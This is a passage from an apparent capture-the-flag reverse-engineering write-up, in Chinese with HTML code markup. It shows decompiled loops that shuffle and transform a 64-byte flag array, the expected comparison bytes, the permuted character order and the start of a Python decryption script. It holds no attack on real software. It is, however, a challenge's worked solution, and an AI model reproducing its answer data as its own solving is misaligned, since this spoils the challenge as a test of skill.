data-num=\"85\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v27 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>unk_55C3745EA320<span class=\"token punctuation\">,</span> <span class=\"token number\">0x200uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    v33 <span class=\"token operator\">=</span> <span class=\"token number\">64LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>    v34 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>dest<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>    <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>      v35 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>v34 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v35 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>      v36 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v33 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v33 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v35<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v35<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v36<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>      v37 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>v34<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>v34 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>      v38 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v33 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v33 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v37<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v37<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v38<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>      v34 <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>      v33 <span class=\"token operator\">-=</span> <span class=\"token number\">2LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v33 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>unk_55C3745EA520<span class=\"token punctuation\">,</span> <span class=\"token number\">0x200uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>    v39 <span class=\"token operator\">=</span> <span class=\"token number\">64LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>    v40 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>dest<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>    <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>      v41 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>v40 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v41 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>      v42 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v39 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v39 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v41<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v41<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v42<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>      v43 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>v40<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>v40 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>      v44 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v39 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v39 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v43<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v43<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v44<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>      v40 <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>      v39 <span class=\"token operator\">-=</span> <span class=\"token number\">2LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v39 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>unk_55C3745EA720<span class=\"token punctuation\">,</span> <span class=\"token number\">0x200uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>    v45 <span class=\"token operator\">=</span> <span class=\"token number\">64LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>    v46 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>dest<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>    <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>      v47 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>v46 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v47 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>      v48 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v45 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v45 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v47<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v47<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v48<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>      v49 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>v46<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>v46 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>      v50 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v45 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v45 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v49<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v49<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v50<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>      v46 <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>      v45 <span class=\"token operator\">-=</span> <span class=\"token number\">2LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v45 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>unk_55C3745EA920<span class=\"token punctuation\">,</span> <span class=\"token number\">0x200uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>    v52 <span class=\"token operator\">=</span> <span class=\"token number\">64LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>    v53 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>dest<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>    <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>      v54 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>v53 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v54 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>      v55 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v52 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v52 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v54<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v54<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v55<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>      v56 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>v53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>v53 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>      v57 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v52 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v52 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v56<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v56<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v57<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>      v53 <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>      v52 <span class=\"token operator\">-=</span> <span class=\"token number\">2LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v52 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>    v58 <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>    <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>      v59 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8<span class=\"token punctuation\">)</span>flagg<span class=\"token punctuation\">[</span>v58<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>      <span class=\"token function\">LOWORD</span><span class=\"token punctuation\">(</span>v51<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>      <span class=\"token function\">LOWORD</span><span class=\"token punctuation\">(</span>v52<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">257</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>      v60 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>      <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>        v62 <span class=\"token operator\">=</span> v52<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>        <span class=\"token function\">LOWORD</span><span class=\"token punctuation\">(</span>v52<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span>v52 <span class=\"token operator\">/</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span>v59<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre>        v61 <span class=\"token operator\">=</span> v62 <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span>v59<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre>        v63 <span class=\"token operator\">=</span> v51<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"183\"></td><td><pre>        v51 <span class=\"token operator\">=</span> v60 <span class=\"token operator\">-</span> v51 <span class=\"token operator\">*</span> v52<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>        <span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>v52<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> v59<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"185\"></td><td><pre>        v59 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v62 <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span>v59<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"186\"></td><td><pre>        v60 <span class=\"token operator\">=</span> v63<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"187\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"188\"></td><td><pre>      <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v61 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"189\"></td><td><pre>      v64 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span>__int16<span class=\"token punctuation\">)</span>v63 <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"191\"></td><td><pre>        v64 <span class=\"token operator\">=</span> v63<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v58<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v64 <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>__int16<span class=\"token punctuation\">)</span>v63 <span class=\"token operator\">>></span> <span class=\"token number\">15</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> v63<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">0x101u</span></pre></td></tr><tr><td data-num=\"193\"></td><td><pre>                  <span class=\"token operator\">+</span> v63</pre></td></tr><tr><td data-num=\"194\"></td><td><pre>                  <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span>v63 <span class=\"token operator\">>></span> <span class=\"token number\">15</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"195\"></td><td><pre>                  <span class=\"token operator\">+</span> <span class=\"token number\">113</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0x89</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"196\"></td><td><pre>      v52 <span class=\"token operator\">=</span> v58 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"197\"></td><td><pre>      v58 <span class=\"token operator\">=</span> v52<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"198\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"199\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v52 <span class=\"token operator\">!=</span> <span class=\"token number\">64</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"200\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"201\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v8 <span class=\"token operator\">!=</span> <span class=\"token number\">256</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 提取出的总的加密</span></pre></td></tr></table></figure><p><img data-src=\"/images/image-20230910153409350.png\" alt=\"image-20230910153409350\"></p>\n<p>不出意外的话 64 位比较数据是 cmp=[0xA7, 0x51, 0x68, 0x52, 0x85, 0x27, 0xFF, 0x31, 0x88, 0x87, 0xD2, 0xC7, 0xD3, 0x23, 0x3F, 0x52, 0x55, 0x10, 0x1F, 0xAF, 0x27, 0xF0, 0x94, 0x5C, 0xCD, 0x3F, 0x7A, 0x79, 0x9F, 0x2F, 0xF0, 0xE7, 0x45, 0xF0, 0x86, 0x3C, 0xF9, 0xB0, 0xEA, 0x6D, 0x90, 0x42, 0xF7, 0x91, 0xED, 0x3A, 0x9A, 0x7C, 0x01, 0x6B, 0x84, 0xDC, 0x6C, 0xC8, 0x43, 0x07, 0x5C, 0x08, 0xF7, 0xDF, 0xEB, 0xE3, 0xAE, 0xA4]    (也就是这 64 位的 4 个 xmmword)</p>\n<p><strong>原顺序 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ {}</strong></p>\n<p><strong>打乱后的顺序 HfVl {qPcCYNMoRi6D7Jr} espOL3FhwdWAtTGZba4Ugjvnx1QkKE2IS9yuz5BX08m</strong></p>\n<p>字符的加密逻辑:</p>\n<pre><code>do\n    &#123;\n      v59 = (unsigned __int8)flagg[v58] + 1;\n      LOWORD(v51) = 1;\n      LOWORD(v52) = 257;\n      v60 = 0;\n      do\n      &#123;\n        v62 = v52;\n        LOWORD(v52) = (unsigned __int16)v52 / (unsigned __int16)v59;\n        v61 = v62 % (unsigned __int16)v59;\n        v63 = v51;\n        v51 = v60 - v51 * v52;\n        LODWORD(v52) = v59;\n        v59 = (unsigned __int16)(v62 % (unsigned __int16)v59);\n        v60 = v63;\n      &#125;\n      while ( v61 );\n      v64 = 0;\n      if ( (__int16)v63 &gt; 0 )\n        v64 = v63;\n      flagg[v58] = ((unsigned __int16)(v64 + ((__int16)v63 &gt;&gt; 15) - v63) / 0x101u\n                  + v63\n                  + ((unsigned __int16)v63 &gt;&gt; 15)\n                  + 113) ^ 0x89;\n      v52 = v58 + 1;\n      v58 = v52;\n    &#125;\n    while ( v52 != 64 );\n</code></pre>\n<p>一阶段脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">:</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">,</span> table<span class=\"token punctuation\">:</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    tmp<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        tmp<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>table<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> tmp</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">reverse_order</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">:</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">,</span> table<span class=\"token punctuation\">:</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    tmp <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        tmp<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">[</span>table<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> tmp</pre></td></tr><tr><td 